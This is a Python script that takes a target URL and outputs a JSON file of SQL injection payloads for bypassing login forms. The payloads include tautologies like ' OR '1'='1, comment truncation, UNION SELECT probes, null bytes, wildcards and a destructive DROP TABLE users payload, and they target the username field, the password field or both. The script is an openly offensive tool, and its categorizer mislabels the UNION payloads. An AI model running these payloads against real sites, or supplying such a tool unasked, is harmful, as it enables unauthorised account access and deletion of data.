import json
import sys
from urllib.parse import urlparse, parse_qs, unquote


def generate_bypass_payload(url, context="username"):
    """
    Generate a JSON payload with injection attempts to bypass login.
    
    Args:
        url: The target URL
        context: 'username', 'password', or 'both' - which field to target
    
    Returns:
        dict: JSON-serializable payload with bypass attempts
    """
    
    parsed = urlparse(url)
    base_url = f"{parsed.scheme or 'http'}://{parsed.netloc}"
    
    # Generate various bypass techniques
    bypass_techniques = {
        "username": [
            # SQL injection variants
            "admin'--",
            "admin' OR '1'='1",
            "admin' OR 1=1--",
            "admin\" OR \"\"\"",
            "admin'; DROP TABLE users;--",
            "admin' UNION SELECT 1,2,3--",
            
            # Logical bypass
            "admin' OR 'x'='x",
            "' OR '1'='1",
            "' OR ''='",
            
            # Comment-based
            "admin'/*",
            "admin'/**/",
            
            # Null byte
            "admin%00",
            "admin\x00",
            
            # Wildcard
            "%",
            "*%*%*",
            
            # Boolean blind
            "admin' AND 1=1--",
            "admin' AND 1=2--",
        ],
        "password": [
            # Empty/null values
            "",
            " ",
            "null",
            "undefined",
            "NaN",
            
            # SQL injection
            "' OR '1'='1",
            "x' OR 1=1--",
            "' OR 1=1--",
            "' OR TRUE--",
            "anything' OR 'x'='x",
            
            # Comment
            "'--",
            "'/*",
            
            # Tautology
            "' OR 1=1",
            "' AND 1=1",
        ],
        "both": [
            # Combined attempts
            {"username": "admin'--", "password": "anything"},
            {"username": "admin' OR '1'='1", "password": "x"},
            {"username": "admin' OR 1=1--", "password": "x"},
            {"username": "admin'/**/", "password": "x"},
            {"username": "admin%00", "password": "x"},
            {"username": "%", "password": "%"},
            {"username": "' OR '1'='1", "password": "' OR '1'='1"},
        ]
    }
    
    # Build the JSON payload
    payload = {
        "target": {
            "url": url,
            "base_url": base_url,
            "path": parsed.path or "/",
            "query": dict(parse_qs(parsed.query)) if parsed.query else {}
        },
        "bypass_attempts": [],
        "metadata": {
            "generated_for": url,
            "context": context,
            "techniques_used": list(bypass_techniques.keys()),
            "total_attempts": 0
        }
    }
    
    if context == "username":
        for attempt in bypass_techniques["username"]:
            payload["bypass_attempts"].append({
                "field": "username",
                "value": attempt,
                "password": "test_password",
                "technique": categorize_technique(attempt),
                "description": f"Username injection: {attempt}"
            })
    elif context == "password":
        for attempt in bypass_techniques["password"]:
            payload["bypass_attempts"].append({
                "field": "password",
                "value": attempt,
                "username": "test_user",
                "technique": categorize_technique(attempt),
                "description": f"Password injection: {attempt}"
            })
    elif context == "both":
        for attempt in bypass_techniques["both"]:
            if isinstance(attempt, dict):
                payload["bypass_attempts"].append({
                    **attempt,
                    "technique": categorize_technique(list(attempt.values())[0]),
                    "description": f"Combined: {json.dumps(attempt)}"
                })
    
    payload["metadata"]["total_attempts"] = len(payload["bypass_attempts"])
    
    return payload


def categorize_technique(value):
    """Categorize what type of injection technique is used"""
    if isinstance(value, str):
        if "--" in value or "/*" in value:
            return "comment_based"
        if "OR" in value.upper() or "AND" in value.upper():
            if "=" in value:
                return "tautology"
            return "logical_operator"
        if "UNION" in value.upper():
            return "union_based"
        if "%" in value or "*" in value:
            return "wildcard"
        if "\x00" in value or "%00" in value:
            return "null_byte"
        if value in ["", " ", "null", "undefined", "NaN"]:
            return "null_value"
        return "basic_injection"
    return "unknown"


def main():
    if len(sys.argv) > 1:
        url = sys.argv[1]
        context = sys.argv[2] if len(sys.argv) > 2 else "both"
    else:
        url = input("Enter target URL: ").strip()
        context = input("Enter context (username/password/both) [both]: ").strip() or "both"
        if context not in ["username", "password", "both"]:
            context = "both"
    
    if not url:
        print("Error: URL cannot be empty")
        return
    
    # Validate URL format
    try:
        parsed = urlparse(url)
        if not parsed.netloc:
            print(f"Warning: '{url}' may not be a valid URL")
    except Exception as e:
        print(f"Error parsing URL: {e}")
        return
    
    # Generate the payload
    payload = generate_bypass_payload(url, context)
    
    # Output as formatted JSON
    print(json.dumps(payload, indent=2))
    
    # Also save to file
    output_file = f"bypass_payload_{parsed.netloc.replace('.', '_')}.json"
    with open(output_file, 'w') as f:
        json.dump(payload, f, indent=2)
    
    print(f"\n✅ Payload saved to: {output_file}")
    print(f"📊 Total bypass attempts: {payload['metadata']['total_attempts']}")
    print(f"🎯 Techniques: {payload['metadata']['techniques_used']}")


if __name__ == "__main__":
    main()
